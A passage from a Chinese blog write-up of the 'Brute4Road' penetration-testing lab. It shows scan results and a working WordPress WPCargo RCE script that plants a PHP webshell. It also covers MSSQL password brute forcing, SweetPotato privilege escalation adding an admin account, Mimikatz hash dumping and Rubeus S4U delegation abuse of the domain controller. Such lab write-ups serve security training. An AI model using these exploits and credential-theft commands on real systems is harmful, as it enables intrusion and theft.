172.22.2.18:139 =&gt; </span><br><span class="line">[2025-03-04 21:18:14] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-03-04 21:18:18] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-03-04 21:18:20] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-03-04 21:18:26] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br></pre></td></tr></table></figure>
+
+<p>stowaway代理搭建</p>
+<p>vps：</p>
+<p>.&#x2F;linux_x64_admin –heartbeat -l 61032 -s aab32</p>
+<p>在被控端（shell机器）启动：</p>
+<p>.&#x2F;linux_x64_agent -c &lt;VPS IP地址&gt;:61032 -s aab32</p>
+<p>建立连接后，在服务端选中上线的节点，并且执行socks命令即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks 端口 用户名 密码</span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure>
+
+<p>此时使用 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 就可以代理到被控端的内网了。</p>
+<p>尝试使用账号密码时不能用，去掉账号密码可以</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096508666-f46f4c5b-86bd-424a-bc0b-cd9899fff26f.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096634000-4fd163b4-8589-414f-8d61-65e3c2cb8e77.png"></p>
+<p>在网上查到相关rce文章，并且给了利用脚本</p>
+<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;ls&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line"></span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>一把梭哈</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097242152-432e24ac-96c4-427c-91ac-19c1404bed23.png"></p>
+<p>连接蚁剑</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097468462-65f4738c-3b1f-4fea-9197-0bb62f215ffd.png"></p>
+<p>注意到config文件，查看，得到数据库用户，密码。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097535093-d8020696-cb8e-4efb-925e-7ac856d333e1.png"></p>
+<p>看到数据库密码</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097611345-626c0295-5559-4f33-a7a4-7ea3a73c8fae.png"></p>
+<p>连一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097825364-0c40cb50-178a-4601-b5c9-957d0ffd7379.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097848512-32f63a9b-b19f-4fa1-a61e-e642a10b52ff.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097893511-d550b24f-bebb-405f-8861-ca75914eb4cb.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097949837-bd1dc40d-912a-49a6-beb0-1c8dbec6fb9a.png"></p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>发现了一个密码表，导出</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741098031228-51623acd-b968-4fdb-8a75-c28e064032b1.png"></p>
+<p>再回到之前的fscan扫描结果，还有1433端口开放去爆破，用那个密码爆破172.22.2.16:1433。</p>
+<p>fscan -h 172.22.2.16 -m mssql -pwdf 1.txt [+] mssql:172.22.2.16:1433:sa ElGNkOiC</p>
+<p>这里环境出了点问题使用pwncat,收到shell之后会进入到pwncat终端模式这时候想要回到shell模式只需输入back</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099289493-89c305d8-7d31-407a-9897-46ccdaba099c.png"></p>
+<p>上mdut</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099687174-ae3aa826-ea72-41f6-b05e-3f0117b68a75.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099672431-f77c0d4c-4dcc-4fe0-bb9a-bc1b7e8c8cb9.png"></p>
+<p>Sweetpotato提权</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173053940-52a8cf16-e934-49b0-9071-498948ab5472.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net user test qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p>rdp上去</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173674191-1d0d56f3-d525-42b3-b4dd-993d7bea54bf.png"></p>
+<p>在用户位置翻到flag<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173741629-bc01e5f5-32a8-4973-810c-8d982b9d2bc3.png"></p>
+<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>发现在域内，上传猕猴桃抓取hash，管理员运行</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173940219-360b1c9b-55da-48b7-b6ee-790d66abcb6b.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741174493844-66ff867c-1d95-4e26-8e0b-d25c5328698b.png"></p>
+<p>这里用Adinfo（<a target="_blank" rel="noopener" href="https://github.com/lzzbb/Adinfo/releases">https://github.com/lzzbb/Adinfo/releases</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.2.3 -u MSSQLSERVER$ -H 26c5767767ddac88dfccd8449fc11502</span><br></pre></td></tr></table></figure>
+
+<p>发现约束委派</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741175206994-aca6b607-39e0-49f8-a5dd-8bfaae57ae49.png">MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，用Rubeus申请访问自身的服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:26c5767767ddac88dfccd8449fc11502 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176177798-4ad88854-8e4f-43eb-b2f3-89b27c855ed1.png"></p>
+<p>之后注入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE35FWG/jPPvxUw/lHeSjZgWtlqb2wYxA+JK8guQVinSocTPiJxmyzJx4QmWVBa2kXo0gizhWCEYNjrSdWhMJ5I8vzw+e8Bft3i5m5svPbcyImYWhDlg7Mvysh0fAekboYFgUWklHkA0OvwPyd9pA8K9e9mNzq2SyxHmkNxWtmX0tgPAZXnowM3DKT9Uewdl0zfHeqCfRqGErml+IxkQmgyllrnxluhlDcU+yjETECmnUX2AUGd9DivoCw2Nk6iTRlc09pCYtU2gVjrte4knoZRw8cmpn5bPnYzXkMBdedYngf0ihW0xo+kKh6XzWuTC1Q4EtTWHQmr/oWzuNfmh0ldOJVx0BarDogz8NCmYIo81zGp9XUYjeajFOC3qRsLGsMwQg0m0CdoX24dRS5haMtTbNVsXt+y1Fk2Q0bykJPN1/U2vol0i2jVGPXJcDsrz5JmFOAWswAQ1pjz/FoPh6/be/0MY2p5tJwmXc7BTSeDLvJAcK5YnbeQZ9KNlLIEB3oECXjdkIq992blr6Nn0+ReEHWQkCreUPjHgTLu69qURQrzOruUZlrV+LusdGptZVg/HCP74aKleqTBp35sT/zyCL+GgqkFq0FLelQxebb8lbbreysa1GG8IivGROl2bqb4w9AqDuoCQTXa87F22nQ24d9ZL1U5STQWKL5d5T0TivwXyRqGNHcveSJfYN17fiwTVhxb5og/F17BLClvid+zDmXe4iZ6oyXgefSXAv35WekdhrywWm3DED3qd7V5WBo1Zd5JRojuZbg0+thmC/gCJcQtoU8xpiIqP/2fKA2NlKQYf5BjhXlbOri/Yq+TRRZVQQUgQS58dYfi9hLNgE5nzlnfmCY49uXCe3WbzoNFVPconnjRJUh9PP+QOk+0l2mLsUKeaQaFldlB8PbAh7nhPPJVycjOACBMNDFUr90VF9WgHnijxvFDkp3XHktauL4EaInkxPg7QSsk0pVCowVrdRRwkPyPVW38/3MwA5/j7Jg7yeice+gV3UcrvRbRChb1fJZcyHcC4BSo9U+iKJtBs1Zcm3DqTQVas4f9qc9eKtQJze+icr+lbMsQwJYk9ZUSOTBueg8eVWGnSwMACaMAjUjkUYYyh36oZMRPb24zr4weUIxGsixxUbLdtnszq8givNuxCXX2ES53L72XxkKuGULblnqL0Yf5O7Hwr2fIkbwRJjnweAd7c/IcT/4uyhnp8VhabIgv9N5UdlTgfCyGyfZVxEhxxPd88ma/QNXsiicnHX/QQ0g8AYLA3175X/n/pBNZZkALWo7PoSc/BB+Xbq3gSrDgMpxaywGu9Gnz/Q1vyk9txVO6WN7x7ivu+3s/z17CwRkjF0LNzoZ4/+JUwQSXesdKTcCdLC0fNodwl0HF2Dkv4nCwvaPh+Xac0i/TpXMQJho6dyphE19l6hXJTTaLolWYQEgkIKgDQlFuCdTKXPkygJxv/G5ED3dGjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBlCcnhKBNudgBbGrCE1V9ZoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMwNTEyMDIyMVqmERgPMjAyNTAzMDUyMjAyMjFapxEYDzIwMjUwMzEyMTIwMjIxWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure>
+
+<p>之后再访问域控里面的flag文件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176338122-b4118e59-c198-46e9-8e3b-0f562523f580.png"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Brute4Road"><span class="toc-number">1.</span> <span class="toc-text">Brute4Road</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%8B%BFshell"><span class="toc-number">1.1.</span> <span class="toc-text">redis主从复制拿shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">域渗透</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&text=春秋云境-Brute4Road"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&is_video=false&description=春秋云境-Brute4Road"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Brute4Road&body=Check out this article: https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&title=春秋云境-Brute4Road"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&name=春秋云境-Brute4Road&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/&t=春秋云境-Brute4Road"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
